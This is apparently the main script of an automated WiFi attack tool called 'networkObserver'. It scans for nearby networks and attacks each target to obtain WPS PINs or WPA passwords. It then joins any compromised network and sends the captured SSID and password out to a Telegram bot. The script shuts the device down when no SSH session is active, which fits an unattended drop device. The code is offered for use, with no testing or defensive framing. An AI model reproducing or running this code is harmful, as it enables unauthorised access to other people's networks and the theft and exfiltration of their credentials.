import os
import time
import logging
import subprocess
from utils import clean_files, setup_logging, is_ssh_connected
from constants import (
    TARGETS_FILE,
    CRACKED_FILE,
    ATTACK_INTERFACE,
    PCAP_FILE,
    STOP_ON_SUCCESS,
    MAX_RUNTIME
)
from wifi_scan import scan_targets
from wifi_attack import attack_target
from wifi_connect import connect_to_wifi
from send_to_telegram import send_message

global_start_time = time.time()

def has_internet():
    try:
        subprocess.check_call(
            ["ping", "-c", "1", "-W", "2", "8.8.8.8"],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return True
    except subprocess.CalledProcessError:
        return False


# Ensure logs directory exists + configure logging
setup_logging()

logging.info("Starting networkObserver")

# Clean temp files
clean_files(TARGETS_FILE, CRACKED_FILE, PCAP_FILE)
logging.info("Temporary files cleaned.")

# Scan for targets
targets = scan_targets(ATTACK_INTERFACE)

# Attack loop
while targets:
    if time.time() - global_start_time > MAX_RUNTIME:
        logging.warning("Max runtime exceeded. Exiting.")
        break

    essid, power = targets.pop(0)
    logging.info(f"Attacking {essid} (power: {power} dB)")
    result = attack_target(ATTACK_INTERFACE, essid)
    if result:
        connected = connect_to_wifi(essid, pin=result.get("pin"), psk=result.get("psk"))
        if connected:
            msg = f"[+] Target compromised:\nSSID: {essid}"
            if result.get("psk"):
                msg += f"\nPassword: {result['psk']}"
            elif result.get("pin"):
                msg += f"\nWPS PIN: {result['pin']}"
            if has_internet():
                logging.info("Connection successful. Sending to Telegram...")
                send_message(msg)
            else:
                logging.warning("Connected, but no internet. Skipping Telegram message.")
            if STOP_ON_SUCCESS:
                logging.info("Stopping after first successful compromise (as per config).")
                break
        else:
            logging.warning(f"Connection to {essid} failed after PIN/PSK.")
    else:
        logging.warning(f"No credentials obtained for {essid}.")

logging.info("Process completed.")

# Shutdown logic
if is_ssh_connected():
    logging.info("SSH session detected. Skipping shutdown.")
else:
    logging.info("No SSH session. Proceeding with shutdown.")
    os.system("sudo poweroff")
